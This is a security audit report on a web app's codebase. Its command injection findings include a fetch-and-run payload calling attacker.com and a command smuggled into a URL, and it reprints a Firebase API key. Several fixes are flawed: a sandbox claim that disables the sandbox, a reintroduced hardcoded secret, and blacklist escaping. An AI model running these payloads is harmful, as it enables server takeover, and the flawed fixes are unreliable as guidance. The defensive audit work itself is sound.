# Security Audit & Vulnerability Assessment Report

This report evaluates the application codebase across ten major security categories: Cross-Site Scripting (XSS), SQL Injection, NoSQL Injection, Cross-Site Request Forgery (CSRF), Authentication Weaknesses, Authorization Bypass, Exposed Secrets, Unsafe Storage, Token Leaks, and Insecure API Endpoints. It outlines specific vulnerabilities discovered and recommends **near-zero risk** security fixes that strictly preserve all current application logic and UI.

---

## 1. Cross-Site Scripting (XSS)

### 1.1. Unsanitized HTML Generation and Rendering in Headless Browsers
- **Location:** `src/server/pdf-ai.ts` (Lines 18–55 and Lines 73–128)
- **Vulnerability:** The backend generates PDFs by inserting model output (`response.choices[0].message.content`) or modified text directly into raw HTML layouts (`htmlContent` and `htmlLayout`), then rendering them using Puppeteer:
  ```typescript
  await page.setContent(htmlContent, { waitUntil: "domcontentloaded" });
  ```
  If a malicious user submits HTML-injectable payloads inside fields like `searchText`, `replaceText`, or the document prompt, or if the AI is coerced via prompt injection to generate malicious scripts, those scripts will execute inside the headless Puppeteer browser context.
- **Risk Level:** High (Can lead to Server-Side Request Forgery or Local File Inclusion if the headless browser accesses local files).
- **Minimal Recommended Fix:**
  Configure Puppeteer to disable local file system access and enforce a strict sandbox when launching:
  ```typescript
  const browser = await puppeteer.launch({
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-local-file-access", // Block local file protocol (file:///)
      "--disable-gpu"
    ],
  });
  ```

### 1.2. Client-side Search and Scraper Output Rendering
- **Location:** `src/components/SearchEngineView.tsx` and `src/components/GlobalSearch.tsx`
- **Assessment:** Client-side rendering is handled natively by React's Virtual DOM, which auto-escapes string content in normal JSX tags `{item.title}`. There is no usage of `dangerouslySetInnerHTML` or direct raw DOM injection in the frontend components. This is excellent and prevents classic client-side XSS.

---

## 2. SQL Injection

- **Location:** Full Workspace (`server.ts`, `src/store/useAppStore.ts`)
- **Assessment:** The application does not utilize a relational SQL database engine (such as PostgreSQL, MySQL, or SQLite). All customer, service ticket, transaction, and print job states are managed exclusively in-memory on the frontend/backend. Consequently, SQL Injection is not an active threat to the current system.
- **Minimal Recommended Fix:** No code fixes required. If a SQL database is added in the future, parameterization must be strictly enforced:
  ```typescript
  // Example of Secure Parameterized Query
  db.query("SELECT * FROM users WHERE email = $1", [userEmail]);
  ```

---

## 3. NoSQL Injection

- **Location:** Full Workspace (`server.ts`, `src/store/useAppStore.ts`)
- **Assessment:** The application does not integrate with any Document/NoSQL database engines (such as MongoDB or CouchDB). Server state is persisted purely inside NodeJS `Map` objects (like `pdfExtractionCache` and `extractionCache`). NoSQL query operators (such as `$gt`, `$ne`, or `$where`) cannot be injected.
- **Minimal Recommended Fix:** No code fixes required. If a NoSQL database is added, use query sanitization utilities or strictly define schema-validated ODMs (like Mongoose) to prevent passing raw JSON objects as query filters.

---

## 4. Cross-Site Request Forgery (CSRF)

- **Location:** `server.ts`
- **Assessment:** The backend has stateless, session-less API endpoints. The frontend uses Firebase Auth, which stores credentials client-side in LocalStorage or IndexedDB and transmits tokens in custom authorization headers. Since the backend does not employ `HttpOnly` session cookies for stateful requests, the browser will not automatically attach credentials, mitigating traditional CSRF vectors.
- **Minimal Recommended Fix:** No immediate code changes required. If cookie-based sessions are adopted in the future, ensure cookies use `SameSite=Lax` or `Strict` flags and implement a custom verification header (e.g., `X-Requested-With`) or validation of `Origin`/`Referer` headers:
  ```typescript
  app.use((req, res, next) => {
    const origin = req.headers.origin || req.headers.referer;
    if (origin && !origin.startsWith(process.env.APP_URL || "")) {
      return res.status(403).send("Forbidden: CSRF check failed");
    }
    next();
  });
  ```

---

## 5. Authentication Weaknesses

### 5.1. Bypass in API Authentication Middleware
- **Location:** `server.ts` (Lines 1111–1117)
- **Vulnerability:** The API-key verification middleware `validateApiKey` is currently a non-functional placeholder that immediately passes control to the next handler:
  ```typescript
  const validateApiKey = (
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    return next();
  };
  ```
  This exposes critical media extraction and YouTube streaming endpoints `/api/media/extract`, `/api/ytdl-core/info`, and `/api/yt-dlp/info` to the public internet, completely bypassing the configured `VITE_MEDIA_PROXY_API_KEY`.
- **Risk Level:** High (Enables unauthenticated extraction spam and potential bandwidth exhaustion).
- **Minimal Recommended Fix:**
  Update `validateApiKey` to verify incoming headers against the configured environment variable:
  ```typescript
  const validateApiKey = (
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    const expectedKey = process.env.VITE_MEDIA_PROXY_API_KEY || "media_secret_secure_key_2026";
    const providedKey = req.headers["x-api-key"] || req.query.apiKey;

    if (!providedKey || providedKey !== expectedKey) {
      return res.status(401).json({ error: "Unauthorized: Invalid API Key" });
    }
    next();
  };
  ```

### 5.2. Unauthenticated AI PDF Generation/Edit endpoints
- **Location:** `src/server/pdf-ai.ts`
- **Vulnerability:** The `/generate` and `/edit` endpoints fallback to the server's `process.env.OPENAI_API_KEY` when no client key is provided. They do not implement any authentication, allowing any malicious party to trigger expensive OpenAI calls on the server's quota.
- **Risk Level:** High (Financial abuse / Service denial).
- **Minimal Recommended Fix:** Add a middleware check to ensure the caller has a valid session or is authorized to spend server credits.

---

## 6. Authorization Bypass

### 6.1. Completely Unprotected Administrative Git API
- **Location:** `server.ts` (Lines 1509–1555)
- **Vulnerability:** The `/api/git` POST endpoint permits executing operations like `status`, `log`, `pull`, `push`, `commit`, and `add` directly on the host repository. It does not carry any session validation, API key check, or authorization constraints.
- **Risk Level:** Critical (Enables remote codebase alteration and server environment mapping by anonymous web clients).
- **Minimal Recommended Fix:**
  Mount a secure administrative middleware on the `/api/git` route to restrict access strictly to authenticated managers:
  ```typescript
  // Minimal fix checking for custom admin header or API Key
  app.post("/api/git", validateApiKey, express.json(), async (req, res) => { ... });
  ```

---

## 7. Exposed Secrets

### 7.1. Exposed Firebase Client API Key in Frontend Assets
- **Location:** `src/lib/firebase.ts` (Lines 4–11)
- **Vulnerability:** The Firebase configuration is committed as plaintext in the client-side library:
  ```typescript
  const firebaseConfig = {
    projectId: "thin-script-nwh20",
    appId: "1:823460019689:web:2a86167a24a40ccf645f78",
    apiKey: "AIzaSyA21gt4v-p7aZOTDPsslMMzme3HrcQ6Szk",
    authDomain: "thin-script-nwh20.firebaseapp.com",
    storageBucket: "thin-script-nwh20.firebasestorage.app",
    messagingSenderId: "823460019689"
  };
  ```
- **Assessment:** In Firebase client-side architecture, the configuration credentials must be shipped to client web apps to complete authentication flows. However, keeping them as plain hardcoded variables is bad practice.
- **Minimal Recommended Fix:** Move public client-side parameters into environment variables prefixed with `VITE_` (e.g., `import.meta.env.VITE_FIREBASE_API_KEY`) and apply domain/refer restrictions in the Google Cloud Console.

### 7.2. Default Hardcoded Credentials Fallback
- **Location:** `src/components/SearchEngineView.tsx` and `src/components/GlobalSearch.tsx`
- **Vulnerability:** If `VITE_MEDIA_PROXY_API_KEY` is not present in the env, it defaults to `"media_secret_secure_key_2026"`. A static fallback compromises any deployment where the administrator forgot to customize the secret.
- **Minimal Recommended Fix:** Never provide default secrets in code; throw an error or handle empty keys gracefully (e.g., disable the proxy endpoint) if the environment variable is missing.

---

## 8. Unsafe Storage

### 8.1. Locally Stored PDF Uploads
- **Location:** `src/server/pdf-ai.ts` (Line 8)
- **Vulnerability:** The uploaded PDFs are stored in the local directory `"uploads/"` within the project's root folder:
  ```typescript
  const upload = multer({ dest: "uploads/" });
  ```
  If this directory is accidentally mapped, exposed by static middleware, or not correctly cleaned up upon request failures, sensitive PDFs containing KRA PINs, National IDs, or personal documents could leak.
- **Risk Level:** Medium.
- **Minimal Recommended Fix:**
  Store temporary files in the OS native temp folder (e.g., using `os.tmpdir()` or `/tmp/`), and wrap executions in robust `try...finally` blocks to guarantee file eviction:
  ```typescript
  const upload = multer({ dest: path.join(os.tmpdir(), "pdf_uploads") });
  ```

---

## 9. Token Leaks

### 9.1. Plaintext Source Stream URLs in GET Query parameters
- **Location:** `server.ts` (Lines 1857–1912)
- **Vulnerability:** The media streaming endpoint `/api/yt/stream` takes the full destination stream URL as a plaintext query parameter `?url=...`. These stream URLs frequently contain IP-bindings, authentication hashes, and expiration tokens from YouTube CDNs or Cobalt instances.
- **Risk Level:** Low-Medium (Leaks CDN tokens in browser histories, web server request logs, and reverse proxy caches).
- **Minimal Recommended Fix:**
  Use POST requests with temporary short-lived request IDs/tokens mapped on the server to retrieve the actual media stream. This prevents raw CDN URLs with authorization tokens from appearing in GET request paths.

---

## 10. Insecure API Endpoints / Command Injection

### 10.1. Shell Command Injection via Git Arguments
- **Location:** `server.ts` (Lines 1509–1555)
- **Vulnerability:** In `/api/git`, the command arguments received from the client are escaped only by replacing double quotes:
  ```typescript
  gitArgs = args.map((a) => `"${a.replace(/"/g, '\\"')}"`).join(" ");
  const { stdout, stderr } = await execAsync(`git ${command} ${gitArgs}`);
  ```
  Because the command is run using `exec` (which spawns a shell), shell features inside double-quotes are fully evaluated. An attacker can supply a parameter containing backticks `` ` `` or dollar expansions `$()`, like `$(curl attacker.com/exploit | sh)`, to trigger Remote Code Execution (RCE).
- **Risk Level:** Critical (Full Server Compromise / RCE).
- **Minimal Recommended Fix:**
  Strictly sanitize all elements of `args` to exclude any shell-control metacharacters before executing:
  ```typescript
  const cleanArgs = args.map(arg => arg.replace(/[;&|`$<>()\\![\]{}*?'"\n\r]/g, ""));
  ```

### 10.2. Shell Command Injection in Local Yt-Dlp Extractor
- **Location:** `server.ts` (Lines 481–555)
- **Vulnerability:** In `extractViaLocalYtdlp`, the user-supplied `videoUrl` parameter is placed directly in the shell execution command:
  ```typescript
  const safeUrl = videoUrl.replace(/"/g, '\\"');
  const fullCmd = `${execCmd} ${proxyArg}${cookiesArg}-j ... "${safeUrl}"`;
  ```
  If the `videoUrl` includes shell execution syntax such as `https://youtube.com/watch?v=abc$(id)`, it will execute arbitrary commands on the host machine.
- **Risk Level:** Critical (RCE).
- **Minimal Recommended Fix:**
  Implement a strict URL whitelist and filter out any shell-control characters from the `videoUrl` or `query` string before executing the subprocess:
  ```typescript
  function sanitizeShellInput(input: string): string {
    return input.replace(/[;&|`$<>()\\![\]{}*?'"\s\n\r]/g, "");
  }
  ```

---

*Report prepared by Jules - Operations Center Security Architect.*
